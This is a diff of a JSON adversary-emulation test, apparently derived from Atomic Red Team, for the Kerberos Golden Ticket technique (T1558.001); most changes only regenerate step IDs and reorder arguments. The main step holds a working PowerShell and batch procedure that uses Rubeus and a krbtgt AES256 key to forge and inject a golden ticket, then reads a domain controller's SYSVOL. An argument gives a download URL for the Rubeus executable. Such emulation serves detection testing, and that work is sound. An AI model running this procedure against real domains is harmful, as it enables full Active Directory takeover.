@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "f4ea4b9d-6fa1-4a10-b591-5798eb111bfb",
+      "id": "b58d78f4-2274-4b45-a1e8-3c8f0c525b9a",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n\u003e%TEMP%\\golden.txt 2\u003e\u00261 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"#{local_folder}\\#{local_executable}\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$(#{domaincontroller})\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "d3e5fc26-379c-4be1-b086-6bcee91edf33",
+      "id": "3dcb1129-1449-4798-ba40-4e1c6fc5bbd7",
       "name": "Check dependency 1/2",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "d05e02cf-8803-4720-b0c3-bc4fddf8230f",
+      "id": "8fc5b437-9788-4cf1-9323-c285ebc7b5c1",
       "name": "Resolve dependency 1/2",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "b1b389f4-ff0c-433d-ac4d-3132d03ef4d8",
+      "id": "f39bed75-17f8-4f90-8ee0-cc666b938299",
       "name": "Re-check dependency 1/2",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -49,7 +49,7 @@
       "elevation_required": false
     },
     {
-      "id": "2dac23dc-0d5b-42a5-8f42-113e78c0b494",
+      "id": "3d144f60-04b9-4e07-9fd4-c6735720f696",
       "name": "Check dependency 2/2",
       "description": "Rubeus must exist\n",
       "type": "execute-command",
@@ -60,7 +60,7 @@
       "elevation_required": false
     },
     {
-      "id": "e7d61c60-89fb-4355-bf9c-2c1494466f6a",
+      "id": "bc32eecb-fc46-439b-9bf9-e216f633e944",
       "name": "Resolve dependency 2/2",
       "description": "Rubeus must exist\n",
       "type": "execute-command",
@@ -71,7 +71,7 @@
       "elevation_required": false
     },
     {
-      "id": "dd447e80-a6cf-4669-bab9-cd8126300a55",
+      "id": "a24b3a65-5d4f-445b-91bf-e6c59873fbf1",
       "name": "Re-check dependency 2/2",
       "description": "Rubeus must exist\n",
       "type": "execute-command",
@@ -84,44 +84,44 @@
   ],
   "flows": [
     {
-      "s": "d3e5fc26-379c-4be1-b086-6bcee91edf33",
+      "s": "3dcb1129-1449-4798-ba40-4e1c6fc5bbd7",
       "p": "on-success",
-      "o": "f4ea4b9d-6fa1-4a10-b591-5798eb111bfb"
+      "o": "b58d78f4-2274-4b45-a1e8-3c8f0c525b9a"
     },
     {
-      "s": "d3e5fc26-379c-4be1-b086-6bcee91edf33",
+      "s": "3dcb1129-1449-4798-ba40-4e1c6fc5bbd7",
       "p": "on-failure",
-      "o": "d05e02cf-8803-4720-b0c3-bc4fddf8230f"
+      "o": "8fc5b437-9788-4cf1-9323-c285ebc7b5c1"
     },
     {
-      "s": "d05e02cf-8803-4720-b0c3-bc4fddf8230f",
+      "s": "8fc5b437-9788-4cf1-9323-c285ebc7b5c1",
       "p": "on-success",
-      "o": "b1b389f4-ff0c-433d-ac4d-3132d03ef4d8"
+      "o": "f39bed75-17f8-4f90-8ee0-cc666b938299"
     },
     {
-      "s": "b1b389f4-ff0c-433d-ac4d-3132d03ef4d8",
+      "s": "f39bed75-17f8-4f90-8ee0-cc666b938299",
       "p": "on-failure",
-      "o": "f4ea4b9d-6fa1-4a10-b591-5798eb111bfb"
+      "o": "b58d78f4-2274-4b45-a1e8-3c8f0c525b9a"
     },
     {
-      "s": "2dac23dc-0d5b-42a5-8f42-113e78c0b494",
+      "s": "3d144f60-04b9-4e07-9fd4-c6735720f696",
       "p": "on-success",
-      "o": "f4ea4b9d-6fa1-4a10-b591-5798eb111bfb"
+      "o": "b58d78f4-2274-4b45-a1e8-3c8f0c525b9a"
     },
     {
-      "s": "2dac23dc-0d5b-42a5-8f42-113e78c0b494",
+      "s": "3d144f60-04b9-4e07-9fd4-c6735720f696",
       "p": "on-failure",
-      "o": "e7d61c60-89fb-4355-bf9c-2c1494466f6a"
+      "o": "bc32eecb-fc46-439b-9bf9-e216f633e944"
     },
     {
-      "s": "e7d61c60-89fb-4355-bf9c-2c1494466f6a",
+      "s": "bc32eecb-fc46-439b-9bf9-e216f633e944",
       "p": "on-success",
-      "o": "dd447e80-a6cf-4669-bab9-cd8126300a55"
+      "o": "a24b3a65-5d4f-445b-91bf-e6c59873fbf1"
     },
     {
-      "s": "dd447e80-a6cf-4669-bab9-cd8126300a55",
+      "s": "a24b3a65-5d4f-445b-91bf-e6c59873fbf1",
       "p": "on-failure",
-      "o": "f4ea4b9d-6fa1-4a10-b591-5798eb111bfb"
+      "o": "b58d78f4-2274-4b45-a1e8-3c8f0c525b9a"
     }
   ],
   "tags": [
@@ -129,18 +129,6 @@
     "T1558.001"
   ],
   "input_arguments": [
-    {
-      "name": "rubeus_url",
-      "type": "url",
-      "description": "URL of Rubeus executable",
-      "value": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
-    },
-    {
-      "name": "domaincontroller",
-      "type": "string",
-      "description": "Targeted Active Directory domain FQDN",
-      "value": "$ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\""
-    },
     {
       "name": "account",
       "type": "string",
@@ -164,6 +152,18 @@
       "type": "string",
       "description": "name of the rubeus executable",
       "value": "rubeus.exe"
+    },
+    {
+      "name": "rubeus_url",
+      "type": "url",
+      "description": "URL of Rubeus executable",
+      "value": "https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe"
+    },
+    {
+      "name": "domaincontroller",
+      "type": "string",
+      "description": "Targeted Active Directory domain FQDN",
+      "value": "$ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\""
     }
   ]
 }
